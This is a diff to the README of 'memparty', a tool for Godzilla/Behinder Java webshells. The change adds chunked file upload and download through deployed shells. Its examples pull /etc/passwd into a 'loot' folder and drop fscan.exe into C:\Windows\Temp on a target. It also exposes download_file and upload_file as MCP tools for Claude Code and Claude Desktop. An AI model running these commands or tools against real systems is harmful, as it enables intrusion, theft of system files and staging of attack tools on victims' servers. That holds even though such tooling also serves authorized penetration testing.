@@ -23,9 +23,11 @@ same HTTP API that powers `party.mem.mk/ui`.
   is alive and the credentials work (echo/handshake round-trip).
 - **Command execution** — `memparty exec` runs a command on a deployed Godzilla / Behinder shell
   and prints its output (real `execCommand` / `Cmd` payload round-trip).
+- **File transfer** — `memparty upload` / `memparty download` move files through Godzilla /
+  Behinder shells, chunked with integrity checks (remote size for Godzilla, MD5 for Behinder).
 - **Named targets** — `memparty save` stores shells in projects (with remark + category),
   then `memparty exec web1/bh9060 --cmd "whoami"` needs no flags at all.
-- **Operation log** — every gen/probe/connect/exec/save/note/remove operation is appended to
+- **Operation log** — every gen/probe/connect/exec/download/upload/save/note/remove operation is appended to
   `~/.memparty/operations.jsonl`; `memparty log` queries it by category and target.
 - **Flexible output** — payload to stdout by default, or `-o file` (auto base64-decodes `.class`/`.jar`).
 - **Any backend** — defaults to the public site, override to your self-hosted instance.
@@ -177,6 +179,39 @@ memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat 
 The gate-header flags are the same as for `connect`; `--json` returns
 `{ ok, tool, url, command, output, durationMs }` for automation.
 
+### File upload / download
+
+`memparty upload` / `memparty download` transfer files through a deployed Godzilla / Behinder
+shell, using the tool's real protocol (Godzilla's `uploadFile`/`bigFileUpload`/`bigFileDownload`
+payload methods; Behinder's `FileOperation` payload class via create+append / downloadPart).
+Large files are chunked automatically. Integrity is verified after transfer — the remote size
+for Godzilla, the remote MD5 for Behinder — a failed check is an error, not a silent bad file.
+
+```bash
+# download: defaults to ./<remote basename>; -o sets the destination
+# (an existing directory keeps the remote basename)
+memparty download -u http://target/shell.jsp -t godzilla --pass pass --key key \
+  --header-value my-secret-token /etc/passwd -o loot/passwd
+
+# an existing local file is never overwritten unless --force is given
+memparty download web1 /var/log/app.log --force
+
+# upload: overwrites the remote file (truncate + write), up to 64 MiB
+memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
+```
+
+Failure semantics are explicit: missing remote file, bad credentials, or an exhausted chunk
+retry all exit 1 with a clear message; an aborted upload warns that the remote file may be
+partial. `--json` returns `{ ok, tool, url, direction, remotePath, localPath, bytes, durationMs }`.
+
+Non-ASCII paths: always fine on Behinder (paths travel inside the class constant pool, so the
+platform charset is irrelevant). Godzilla's payload decodes path parameters with the server's
+platform default charset — UTF-8 on JDK 18+ and virtually all Linux, so nothing is needed; on an
+old JDK (8/11/17) on Chinese Windows the default is GBK — pass `--remote-charset GBK` (MCP:
+`remoteCharset`) for non-ASCII paths there. On Behinder, files over 128 MiB are verified by size
+instead of MD5 (the payload's check reads the whole file byte-by-byte). Limits: 2 GiB for
+Godzilla (a payload int restriction), 64 MiB for Behinder upload, 2 GiB for Behinder download.
+
 ### Saved targets (projects)
 
 Save a shell once, then reference it by name — no more flag soup. Shells live inside
@@ -208,9 +243,9 @@ Explicit flags still override stored values (`memparty exec web1 --cmd id --pass
 
 ### Operation log
 
-Every operation (gen, probe, connect, exec, save/note/remove) is appended as one JSON
-line to `~/.memparty/operations.jsonl` — target, outcome, duration, and for exec the command
-plus truncated output. Credentials and payload bytes are never logged.
+Every operation (gen, probe, connect, exec, download, upload, save/note/remove) is appended as
+one JSON line to `~/.memparty/operations.jsonl` — target, outcome, duration, and for exec the
+command plus truncated output. Credentials, payload bytes, and file contents are never logged.
 
 ```bash
 memparty log                          # latest 50 operations, newest first
@@ -332,7 +367,8 @@ Example Claude Code / Claude Desktop config:
 
 Exposed tools: `list_servers`, `list_config`, `list_packers`, `list_command_configs`,
 `generate_memshell`, `generate_probe`, `parse_classname`, `server_version`, `connect_test`,
-`exec_command`, `target_save`, `target_note`, `target_list`, `target_remove`, `log_list`.
+`exec_command`, `download_file`, `upload_file`, `target_save`, `target_note`, `target_list`,
+`target_remove`, `log_list`.
 
 ## AI skill (Claude Code)
 
